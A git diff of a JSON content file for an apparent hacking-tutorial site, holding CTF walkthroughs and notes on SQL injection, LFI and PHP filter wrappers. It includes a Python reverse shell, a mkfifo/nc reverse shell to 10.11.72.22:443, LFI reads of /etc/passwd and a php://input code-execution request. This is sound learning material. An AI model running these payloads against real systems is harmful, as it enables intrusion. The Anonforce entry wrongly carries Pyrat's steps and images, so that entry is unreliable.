@@ -5,6 +5,8 @@
     "title": "ColdBox: Easy",
     "category": "walkthrough",
     "youtubeUrl": "https://www.youtube.com/watch?v=iIsBbtpn-u0",
+    "blocksFile": "./blocks/cold-box.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
         "type": "section_heading",
@@ -314,16 +316,16 @@
         "language": "bash",
         "code": "Root Flag: [Redacted]"
       }
-    ],
-    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+    ]
   },
-
   {
     "id": 2,
     "slug": "pyrat",
     "title": "Pyrat",
     "category": "walkthrough",
-    "youtubeUrl":"https://youtu.be/ysZWgL-fduY",
+    "youtubeUrl": "https://youtu.be/ysZWgL-fduY",
+    "blocksFile": "./blocks/pyrat.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
         "type": "section_heading",
@@ -553,14 +555,16 @@
         "id": "root-access",
         "text": "With data we logged in with normal admin user, which was supported in basic authentication and we wrote shell we got this information from the file we got before and in last we got the flag, thats it."
       }
-    ],
-    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+    ]
   },
   {
     "id": 3,
     "slug": "anon-force",
     "title": "Anonforce",
     "category": "walkthrough",
+    "blocksFile": "./blocks/pyrat.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "youtubeUrl": "https://youtu.be/pN1WefcyaAI",
     "blocks": [
       {
         "type": "section_heading",
@@ -576,28 +580,18 @@
         "type": "code_block",
         "id": "nmap-command",
         "language": "bash",
-        "code": "nmap -p- -T4 -A -v 10.112.158.30"
+        "code": "nmap -p- -T4 -A -v 10.49.172.22"
       },
       {
         "type": "image",
         "id": "nmap-scan-screenshot",
-        "src": "/assets/walkthroughs/anon-force/nmap.png",
+        "src": "/assets/walkthroughs/pyrat/nmap.png",
         "alt": "Nmap scan result"
       },
       {
         "type": "paragraph",
         "id": "further-details",
-        "text": "As we can see, we found two ports: `ftp` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `ftp`."
-      },
-      {
-        "type": "paragraph",
-        "id": "further-details",
-        "text": "From the image we can see that notread and tmp are NSE writeable, keep that in mind."
-      },
-      {
-        "type": "paragraph",
-        "id": "further-details",
-        "text": "Writeable means we are able to write to those files"
+        "text": "As we can see, we found two ports: `http` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `http`."
       },
       {
         "type": "section_heading",
@@ -607,101 +601,209 @@
       {
         "type": "paragraph",
         "id": "further-enumeration",
-        "text": "Then we will go to ftp and try to explore.."
+        "text": "Then we visited website on the following url."
       },
       {
         "type": "code_block",
         "id": "url",
         "language": "bash",
-        "code": "ftp 10.112.158.30 21"
+        "code": "http://10.49.172.22:8000/"
+      },
+      {
+        "type": "image",
+        "id": "ui-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/basic-connection.png",
+        "alt": "Nmap scan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "We can see it says, try a more basic conection so we will go with it and try to access it with a basic connection."
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "nc 10.49.172.22 8000"
       },
       {
         "type": "image",
         "id": "nc-scan-screenshot",
-        "src": "/assets/walkthroughs/anon-force/ftp.png",
+        "src": "/assets/walkthroughs/pyrat/python.png",
         "alt": "Nc scan result"
       },
       {
         "type": "paragraph",
         "id": "further-details",
-        "text": "From nmap result we got our first flag by downloading and viewing user.txt"
+        "text": "As we can see we got something like shell but it can only execute python code so now in next step we will setup a reverse shell."
       },
       {
         "type": "section_heading",
         "id": "reverse-shell",
-        "text": "Privilege Escalation"
+        "text": "Reverse Shell"
       },
       {
         "type": "paragraph",
         "id": "reverse-shell",
-        "text": "After looking for some time i didn't get anyting intresting then i decided t go to notread directory which we got from nmap result "
+        "text": "Now we will setup reverse shell, so first we need python reverse shell so for this we will go to https://www.revshells.com "
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "import socket,os,pty;s=socket.socket();s.connect(('IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Remember to use your IP and PORT instead of the placeholders in the above command and before executing this open a listener in another tab by writing below command."
+      },
+      {
+        "type": "code_block",
+        "id": "url",
+        "language": "bash",
+        "code": "nc -lvnp PORT"
       },
       {
         "type": "image",
         "id": "shell-scan-screenshot",
-        "src": "/assets/walkthroughs/anon-force/pgp.png",
+        "src": "/assets/walkthroughs/pyrat/www-data.png",
         "alt": "Shell"
       },
       {
         "type": "paragraph",
         "id": "further-details",
-        "text": "For detail understanding of pgp or gpg kindly go to gpg notes or gpg notes."
+        "text": "So as we can see we gained intital foothold and now we will check files and look for something which can give us any user access."
+      },
+      {
+        "type": "image",
+        "id": "shell-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/shell.png",
+        "alt": "Shell"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "After enumerating we got a config file and upon viewing it we got username and password."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh",
+        "text": "SSH"
       },
       {
         "type": "paragraph",
         "id": "ssh-access",
-        "text": "Now we need to decrypt these 2 files which we got, we would decrypt them with below commands."
+        "text": "Now we will access into system via SSH and the credientials we got."
       },
       {
         "type": "code_block",
         "id": "url",
         "language": "bash",
-        "code": "gpg2john private.asc > gpg.hash"
+        "code": "ssh user@10.49.172.22"
+      },
+      {
+        "type": "image",
+        "id": "shell-scan-screenshot",
+        "src": "/assets/walkthroughs/pyrat/shell.png",
+        "alt": "Shell"
+      },
+      {
+        "type": "section_heading",
+        "id": "user-flag",
+        "text": "User Flag"
       },
       {
         "type": "paragraph",
-        "id": "ssh-access",
-        "text": "First we know that private.asc contains private key which we need to decrypt backup file, but that file is also password protected so we are just extracting it passphrase."
+        "id": "user-access",
+        "text": "With this we access user flag."
       },
       {
-        "type": "code_block",
-        "id": "url",
-        "language": "bash",
-        "code": "john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt"
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/userflag.png",
+        "alt": "User flag"
       },
       {
-        "type": "paragraph",
-        "id": "ssh-access",
-        "text": "This will give us the passphrase and we can enter this passphrase while decrypting, system will ask for that passphrase when decrypting."
-      },
-      {
-        "type": "code_block",
-        "id": "url",
-        "language": "bash",
-        "code": "gpg --import private.asc"
-      },
-      {
-        "type": "code_block",
-        "id": "url",
-        "language": "bash",
-        "code": "gpg --decrypt backup.pgp"
+        "type": "section_heading",
+        "id": "root-flag",
+        "text": "Root Flag"
       },
       {
         "type": "paragraph",
-        "id": "ssh-access",
-        "text": "First we load private key from .asc file and we decypted using that private key and we got the user and it's ssh password, by decrypting that password we got root shell and from there we got the root password."
+        "id": "root-access",
+        "text": "Ok so for root flag we will start by checking out files first"
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/understanding.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So here upon viewing gitconfig file we see it is referring to another directory which is /opt, so we will go there and check it."
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/file.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So we restored a file and lets try to understand it."
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So basically it is checking that if socket is admin or not so we know that we need to access it from admin and then we will write shell which will give us root shell, now will use a script which will bruteforce the password."
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/password.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "Now what we will do is to run this file, you can get this code from this url: https://github.com/Azid-ops/Important-Material---THM/blob/main/shell.py"
+      },
+      {
+        "type": "image",
+        "id": "user-flag",
+        "src": "/assets/walkthroughs/pyrat/abc.png",
+        "alt": "User flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "So now we got the password and now remember admin is not any user but it is used in simple authentication so we just use that."
+      },
+      {
+        "type": "image",
+        "id": "root-flag",
+        "src": "/assets/walkthroughs/pyrat/root.png",
+        "alt": "Root flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "root-access",
+        "text": "With data we logged in with normal admin user, which was supported in basic authentication and we wrote shell we got this information from the file we got before and in last we got the flag, thats it."
       }
-    ],
-    "goodbyeMessage":"Good luck, and happy hacking 🚀",
-    "youtubeUrl":"https://youtu.be/pN1WefcyaAI"
+    ]
   },
-
-
   {
     "id": 3,
     "slug": "mysql-error-based",
     "title": "ERROR BASED SQLI - MYSQL",
     "category": "notes",
+    "blocksFile": "./blocks/sql-error-based.json",
+    "youtubeUrl": "https://youtu.be/agSq415rFEs",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
         "type": "section_heading",
@@ -724,7 +826,6 @@
         "id": "further-details",
         "text": "`'` if you use this and if you get mysql syntax error then bingo there is ERROR BASED injection in the web app."
       },
-
       {
         "type": "section_heading",
         "id": "initial-access",
@@ -840,15 +941,16 @@
         "id": "further-details",
         "text": "This is also pretty straight forward this will give you the row data"
       }
-    ],
-    "youtubeUrl":"https://youtu.be/agSq415rFEs",
-    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+    ]
   },
   {
     "id": 3,
     "slug": "postgres-error-based",
     "title": "ERROR BASED SQLI - POSTGRES",
     "category": "notes",
+    "blocksFile": "./blocks/postgres-error-based.json",
+    "youtubeUrl": "https://youtu.be/agSq415rFEs",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
         "type": "section_heading",
@@ -871,7 +973,6 @@
         "id": "further-details",
         "text": "If you use above command and if you get postgres syntax error then bingo there is ERROR BASED injection in the web app."
       },
-
       {
         "type": "section_heading",
         "id": "initial-access",
@@ -956,15 +1057,16 @@
         "id": "further-details",
         "text": "This is also pretty straight forward this will give you the row data"
       }
-    ],
-    "youtubeUrl":"https://youtu.be/agSq415rFEs",
-    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+    ]
   },
   {
     "id": 3,
     "slug": "pgp",
     "title": "PGP DECRYPTION",
     "category": "notes",
+    "blocksFile": "./blocks/pgp.json",
+    "youtubeUrl": "https://youtu.be/pN1WefcyaAI",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
         "type": "section_heading",
@@ -1030,20 +1132,21 @@
         "id": "further-details",
         "text": "For a practical understanding of gpg or gpg kindly look at Anonforce walkthrough."
       }
-    ],
-    "youtubeUrl":"https://youtu.be/pN1WefcyaAI",
-    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+    ]
   },
-    {
+  {
     "id": 3,
     "slug": "suid",
     "title": "SUID BINARY ENUMERATION",
     "category": "notes",
+    "blocksFile": "./blocks/suid-binary.json",
+    "youtubeUrl": "https://youtu.be/uf8v-LugywU",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
         "type": "section_heading",
         "id": "initial-access",
-        "text": "What is a SUID binary??"
+        "text": "What is a SUID binary?"
       },
       {
         "type": "paragraph",
@@ -1143,7 +1246,617 @@
         "id": "further-details",
         "text": "Here we changed our UID to 0, btw 0 UID is of root, so now when it will check UID is 0 and EUID is 0 then it will give us a root shell."
       }
+    ]
+  },
+  {
+    "id": 4,
+    "slug": "lfi",
+    "title": "LFI - Local File Inclusion",
+    "category": "notes",
+    "blocksFile": "./blocks/lfi.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "What is LFI?"
+      },
+      {
+        "type": "paragraph",
+        "id": "lfi-definition",
+        "text": "LFI stands for <highlight>Local File Inclusion</highlight>. It is a vulnerability that allows an attacker to include and read files from the local server through a vulnerable parameter."
+      },
+      {
+        "type": "paragraph",
+        "id": "lfi-definition",
+        "text": "When exploiting LFI, the file is accessed by the web server process, typically running as <highlight>www-data</highlight>. This means you can only read files that the web server user (<highlight>www-data</highlight>) has permission to access."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "How to Get Files Using LFI?"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-conditions",
+        "title": "Conditions Required for LFI",
+        "items": [
+          "The application must use a parameter to load or include a file.",
+          "The parameter must not properly sanitize or validate user input.",
+          "The web server must have permission to read the targeted file."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "Now let's attempt to read a file using LFI. Below is the URL that allows us to access a file on the server."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://VictimIP/secret-script.php?file=../../../../etc/passwd"
+      },
+      {
+        "type": "explanation",
+        "id": "pgp-definition",
+        "title": "Breaking Down the URL",
+        "items": [
+          "The vulnerable file here is <highlight>secret-script.php</highlight>.",
+          "This file accepts a parameter that is used to include other files.",
+          "Because it does not properly validate input, we can exploit it to read files that the <highlight>web server</highlight> has access to."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-2",
+        "text": "If the exploit is successful, you will receive output similar to the following. You may also try reading <highlight>/etc/hosts</highlight> if the web server has permission to access it."
+      },
+      {
+        "type": "output_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "root:x:0:0:root:/root:/bin/bash ..."
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-3",
+        "text": "Now we will try to read the source code of the same file instead of executing it."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "curl -s 'http://10.10.184.98/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d"
+      },
+      {
+        "type": "explanation",
+        "id": "pgp-definition",
+        "title": "Breaking Down the Command",
+        "items": [
+          "We use the <highlight>php://filter</highlight> wrapper to encode the file in <highlight>base64</highlight>.",
+          "We cannot retrieve the raw PHP source directly because it would execute on the server instead of being displayed.",
+          "After retrieving the base64-encoded content, we decode it locally to view the actual source code safely."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "initial-access",
+        "text": "Let's examine the retrieved source code."
+      },
+      {
+        "type": "output_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "<?php\n  //echo \"Hello World\";\n  if(isset($_GET['file'])) {\n    $file = $_GET['file'];\n    include($file);\n  }\n?>"
+      },
+      {
+        "type": "explanation",
+        "id": "pgp-definition",
+        "title": "Analyzing the Source Code",
+        "items": [
+          "The script checks for the parameter using <highlight>if(isset($_GET['file']))</highlight>.",
+          "There is no input validation or sanitization applied to the user-controlled parameter.",
+          "The function <highlight>include($file);</highlight> directly includes the user-supplied value, which makes this highly vulnerable to LFI."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "initial-access",
+        "text": "Basic LFI is done here, if you really want to learn about how can we use filter wrapper then take a look at <highlight>Filter chain generator</highlight> which is using filter wrapper."
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "slug": "filter-chain-generator",
+    "title": "Filter Chain Generator",
+    "category": "notes",
+    "blocksFile": "./blocks/filter-chain-generator.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
     ],
-    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+    "courseMaterials": [
+      {
+        "title": "TryHackMe - Cheese CTF",
+        "url": "https://tryhackme.com/room/cheesectfv10"
+      },
+      {
+        "title": "Filter Chain Generator - Github Repo",
+        "url": "https://github.com/synacktiv/php_filter_chain_generator"
+      }
+    ],
+    "blocks": [
+      {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "P.S: Before continuing, make sure you understand <highlight>LFI</highlight>. You can find related learning resources in the <highlight>Course Material</highlight> section."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "What is a Filter Chain Generator?"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-tip",
+        "title": "Purpose of the Filter Chain Generator",
+        "items": [
+          "The Filter Chain Generator is used to encode a PHP script so that it does not execute immediately when sent to the target machine.",
+          "It uses PHP stream <highlight>wrapper</highlight> techniques internally.",
+          "For the <highlight>Filter Chain Generator</highlight> to work, ensure that <highlight>LFI</highlight> is working on the target machine."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-2",
+        "text": "Let's look at the command used to execute the Filter Chain Generator."
+      },
+      {
+        "type": "code_block",
+        "id": "example-1",
+        "code": "python3 php_filter_chain_generator.py --chain '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f\"); ?>' | grep '^php' > payload.txt"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-tip-2",
+        "title": "Understanding the Command",
+        "items": [
+          "It uses the <highlight>php_filter_chain_generator.py</highlight> script.",
+          "<highlight>--chain</highlight> tells the tool to encode everything that comes after it.",
+          "The PHP code provided is a one-line reverse shell that opens a connection back to the attacker.",
+          "<highlight>grep '^php'</highlight> filters the output and keeps only the line that starts with <highlight>php</highlight>.",
+          "Finally, the clean encoded payload is saved into the <highlight>payload.txt</highlight> file."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-3",
+        "text": "After this, we will send the encoded string using LFI."
+      },
+      {
+        "type": "code_block",
+        "id": "example-2",
+        "code": "curl -s 'http://10.10.184.98/secret-script.php?file=$(cat payload.txt)'"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-tip-3",
+        "title": "How This Works",
+        "items": [
+          "This request sends the encoded payload to the target machine through the vulnerable LFI parameter.",
+          "The <highlight>payload.txt</highlight> file contains a PHP filter chain, not just raw PHP code.",
+          "PHP will decode the chain step by step until the original PHP code is reconstructed and executed."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "slug": "filter",
+    "title": "Filter - LFI",
+    "category": "notes",
+    "blocksFile": "./blocks/filter.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "courseMaterials": [
+      {
+        "title": "TryHackMe - Cheese CTF",
+        "url": "https://tryhackme.com/room/cheesectfv10"
+      },
+      {
+        "title": "Filter Chain Generator - Github Repo",
+        "url": "https://github.com/synacktiv/php_filter_chain_generator"
+      }
+    ],
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "filter-lfi",
+        "text": "Filter - LFI"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-filter-intro",
+        "title": "php://filter",
+        "items": [
+          "It allows you to apply filters before PHP reads or writes a file.",
+          "In short, you are telling PHP: <highlight>Before processing this file, modify its content.</highlight>"
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "Let's look at a basic example."
+      },
+      {
+        "type": "code_block",
+        "id": "example-base64",
+        "code": "http://TargetIP/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-filter-understanding",
+        "title": "Understanding the Command",
+        "items": [
+          "Here we used <highlight>convert.base64-encode</highlight> to encode the file so that PHP does not execute the code.",
+          "The server returns the content in <highlight>base64</highlight> format, which we can decode locally to read the source code."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "filter-read-lfi",
+        "text": "Filter + read - LFI"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-read-intro",
+        "title": "What is read?",
+        "items": [
+          "<highlight>read=</highlight> tells PHP to apply filters when the file is being read.",
+          "If only one filter is used, PHP assumes read mode automatically, so writing <highlight>read=</highlight> is optional.",
+          "When chaining multiple filters, <highlight>read=</highlight> must be explicitly defined."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-2",
+        "text": "Now let's look at a chained read filter."
+      },
+      {
+        "type": "code_block",
+        "id": "example-read-chain",
+        "code": "http://TargetIP/secret-script.php?file=php://filter/read=convert.base64-encode|string.rot13/resource=secret-script.php"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-read-understanding",
+        "title": "Understanding the Chained Filters",
+        "items": [
+          "This command first <highlight>encodes</highlight> the file using base64.",
+          "Then it applies <highlight>string.rot13</highlight> to rotate the encoded string.",
+          "Multiple filters can be combined using the <highlight>|</highlight> symbol.",
+          "Filters are applied from left to right."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "filter-write-lfi",
+        "text": "Filter + write - LFI"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-write-intro",
+        "title": "What is write?",
+        "items": [
+          "<highlight>write=</highlight> applies filters when data is being written to a file.",
+          "It modifies the data before it is saved.",
+          "This only works if the application uses file-writing functions such as <highlight>file_put_contents()</highlight> or <highlight>fwrite()</highlight>.",
+          "In a normal LFI using include(), <highlight>write=</highlight> does not work because include() only reads files."
+        ]
+      },
+      {
+        "type": "code_block",
+        "id": "example-write-filter",
+        "code": "php://filter/write=convert.base64-decode/resource=shell.php"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-write-understanding",
+        "title": "Understanding the Command",
+        "items": [
+          "For this to work, the application must write user-controlled data into the file.",
+          "You must supply base64-encoded content (for example in a POST body).",
+          "The write filter will decode the data first, then save the decoded result into <highlight>shell.php</highlight>.",
+          "If there is no file-writing function in the application, this technique will not work."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-summary",
+        "text": "So far we have covered the two main modes supported by php://filter: read and write."
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "slug": "filter-input",
+    "title": "Filter Input - LFI",
+    "category": "notes",
+    "blocksFile": "./blocks/lfi-input-wrapper.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "courseMaterials": [
+      {
+        "title": "TryHackMe - Cheese CTF",
+        "url": "https://tryhackme.com/room/cheesectfv10"
+      }
+    ],
+    "blocks": [
+      {
+        "id": "download-lfi-lab",
+        "type": "download",
+        "title": "LFI Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "lfi-input-lab.zip",
+        "url": "/downloads/lfi-input-lab.zip",
+        "size": "4kb"
+      },
+      {
+        "type": "section_heading",
+        "id": "filter-lfi",
+        "text": "Filter Input - LFI"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-filter-intro",
+        "title": "php://input",
+        "items": [
+          "It is just a <highlight>PHP stream wrapper</highlight>",
+          "It contains the <highlight>raw HTTP request body</highlight>"
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "Let's look at a basic example."
+      },
+      {
+        "type": "code_block",
+        "id": "example-rce-request",
+        "code": "curl -X POST \"http://127.0.0.1:4000/secret-script.php?file=php://input\" -H \"Content-Type: text/plain\" --data '<?php echo \"RCE_WORKING\\n\"; system(\"id\"); ?>'"
+      },
+      {
+        "type": "explanation",
+        "id": "lfi-filter-understanding",
+        "title": "Understanding the Command",
+        "items": [
+          "Here we used <highlight>php://input</highlight> which serves the raw request body.",
+          "It must be a <highlight>POST</highlight> request.",
+          "The vulnerable file must use <highlight>include()</highlight> or <highlight>require()</highlight> on user-controlled input.",
+          "Content-Type should be <highlight>text/plain</highlight> to avoid PHP consuming the body as form data.",
+          "The PHP code inside --data will only execute if <highlight>include()</highlight> processes php://input and <highlight>allow_url_include</highlight> is enabled."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-2",
+        "text": "Now let's look at the output of the above command."
+      },
+      {
+        "type": "output_block",
+        "id": "example-rce-output",
+        "code": "RCE_WORKING uid=1000(azid) gid=1000(azid) groups=1000(azid),4(adm),20(dialout)..."
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-3",
+        "text": "Sometimes PHP stream wrappers are disabled. You need to check the configuration."
+      },
+      {
+        "type": "code_block",
+        "id": "check-allow-url-include",
+        "code": "php -i | grep allow_url_include"
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-4",
+        "text": "If the result shows Off, then wrapper-based RCE will not work. On real targets you cannot change this setting. On a local lab machine you can modify it for learning purposes."
+      },
+      {
+        "type": "code_block",
+        "id": "edit-php-ini",
+        "code": "sudo nano /etc/php/*/cli/php.ini"
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-5",
+        "text": "Change <highlight>allow_url_include = Off</highlight> to <highlight>allow_url_include = On</highlight> and restart the PHP server."
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "slug": "all-filters",
+    "title": "All Filters - LFI",
+    "category": "notes",
+    "blocksFile": "./blocks/all-filters.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "blocks": [
+      {
+        "id": "download-lfi-lab",
+        "type": "download",
+        "title": "LFI Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "lfi-input-lab.zip",
+        "url": "/downloads/lfi-input-lab.zip",
+        "size": "4kb"
+      },
+      {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "We will examine each stream filter one by one."
+      },
+      {
+        "type": "section_heading",
+        "id": "encoding-filters",
+        "text": "Encoding Filters"
+      },
+      {
+        "type": "code_block",
+        "id": "base64-encode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-encode/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "base64-encode-explain",
+        "text": "Encodes file content into Base64 format and prevents PHP execution."
+      },
+      {
+        "type": "code_block",
+        "id": "base64-decode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-decode/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "base64-decode-explain",
+        "text": "Decodes Base64 encoded content back into original form."
+      },
+      {
+        "type": "code_block",
+        "id": "base64-chain-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-encode|convert.base64-decode/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "base64-chain-explain",
+        "text": "Encodes and then decodes the content. Final result behaves like direct file inclusion."
+      },
+      {
+        "type": "code_block",
+        "id": "quoted-printable-encode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.quoted-printable-encode/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "quoted-printable-encode-explain",
+        "text": "Encodes special characters into quoted-printable format (example: < becomes =3C)."
+      },
+      {
+        "type": "code_block",
+        "id": "quoted-printable-decode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.quoted-printable-decode/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "quoted-printable-decode-explain",
+        "text": "Decodes quoted-printable encoded content back to normal text."
+      },
+      {
+        "type": "code_block",
+        "id": "iconv-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "iconv-explain",
+        "text": "Converts character encoding from UTF-8 to UTF-16, modifying underlying byte structure."
+      },
+      {
+        "type": "section_heading",
+        "id": "compression-filters",
+        "text": "Compression Filters"
+      },
+      {
+        "type": "code_block",
+        "id": "zlib-deflate-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=zlib.deflate/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "zlib-deflate-explain",
+        "text": "Compresses the file content using zlib compression."
+      },
+      {
+        "type": "code_block",
+        "id": "zlib-inflate-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=zlib.inflate/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "zlib-inflate-explain",
+        "text": "Decompresses previously compressed zlib content."
+      },
+      {
+        "type": "section_heading",
+        "id": "string-filters",
+        "text": "String Filters"
+      },
+      {
+        "type": "code_block",
+        "id": "rot13-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.rot13/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "rot13-explain",
+        "text": "Applies ROT13 substitution cipher to alphabetic characters."
+      },
+      {
+        "type": "code_block",
+        "id": "toupper-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.toupper/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "toupper-explain",
+        "text": "Converts alphabetic characters to uppercase."
+      },
+      {
+        "type": "code_block",
+        "id": "tolower-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.tolower/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "tolower-explain",
+        "text": "Converts alphabetic characters to lowercase."
+      },
+      {
+        "type": "section_heading",
+        "id": "other-filters",
+        "text": "Other Filters"
+      },
+      {
+        "type": "code_block",
+        "id": "dechunk-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=dechunk/resource=secret-script.php\""
+      },
+      {
+        "type": "order_block",
+        "id": "dechunk-explain",
+        "text": "Removes HTTP chunked transfer encoding from content."
+      }
+    ]
   }
 ]
